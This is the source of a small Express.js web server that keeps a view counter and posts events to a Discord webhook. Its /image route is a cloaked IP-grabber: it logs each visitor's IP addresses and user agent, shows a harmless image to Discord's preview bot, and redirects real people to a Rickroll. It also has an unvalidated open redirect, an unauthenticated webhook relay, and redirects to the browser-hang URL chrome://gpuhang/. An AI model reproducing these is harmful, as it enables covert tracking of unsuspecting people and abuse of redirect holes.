const express = require("express");
const fs = require("fs");
const discordThings = require("./discord_things");
const app = express();
const bodyParser = require('body-parser');
const viewsPath=__dirname+"/nonpublic/views.txt";
const LOCKDOWN=false;
const Auth = express.Router(); 
var VERSION = "v3.05";
var MESSAGE = "staircase";
var TAG = "";

var WTV_debounce=false


Auth.use((req, res, next)=>{ // Authenticates every request made to server.
  if (LOCKDOWN==false){
    if (!req.secure) {
      res.redirect(`https://${req.hostname}`); next();
    }else{ next(); }
  }else{
    res.redirect("chrome://gpuhang/");
  }
});

app.set("trust proxy", true);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use(express.static("views"));
app.use("/*", Auth);

function createView(){
  if (WTV_debounce===false) {
    
    WTV_debounce=true
    fs.readFile(viewsPath, (err, data)=>{
      if (err){console.log("Error getting views"); WTV_debounce=false; return;}
      var views=parseInt(data)+1;
      fs.writeFile(viewsPath, views.toString(), "utf8", (err)=>{
        if (err){console.log("Error writing to views.txt"); WTV_debounce=false; return;}
        console.log("Views: "+views);
        discordThings.webhook({message: `Views: ${views}`});
        WTV_debounce=false;
      })
    });
    
  }else{
    discordThings.webhook({message: "Multiple people viewed at same time. Rejected view to prevent corruption."})
    console.log("Multiple people viewing at same time (rejected view)");
  }
}


app.get("/", (request, response) => {
  response.sendFile(__dirname + "/nonpublic/index.html");
  createView();
});
app.get("/views", (req, res)=>{
  fs.readFile(viewsPath, (err, data)=>{
    if (err){res.status(200); console.log("Error getting views"); return;}
    res.send(data).status(200);
  });
});
app.get("/redirect", (req, res)=>{
  var location=req.query.location
  res.sendFile(__dirname+"/nonpublic/redirect.html")
  setTimeout(()=>{
    res.redirect(location)
  }, 2000);
});
app.get("/version", (req, res)=>{
  res.send({v:VERSION,redirect:"chrome://gpuhang/",message:MESSAGE,tag:TAG});
});
app.get("/image", (req, res)=>{
  fs.appendFile(__dirname+"/nonpublic/log.txt", `\n[IP: ${req.ip}], [IPS: ${req.ips}], [USERAGENT: ${req.get('user-agent')}]`, (err)=>{
    if (err) throw err;
  });
  
  console.log(req.get("user-agent"));

  if ( req.get('user-agent')=="Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)" ) {
    discordThings.webhook({message: "Bot detected"});
    res.sendFile(__dirname+"/nonpublic/xd.png");
  }else{
    discordThings.webhook({message: "Gotcha"});
    res.redirect("https://youtu.be/dQw4w9WgXcQ");
  }
});
app.post("/webhook", (req, res)=>{
  discordThings.webhook({message: req.body.message});
  console.log(req.body.message);
});

const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
  discordThings.webhook({message: "Server is online. Port: "+listener.address().port});
});
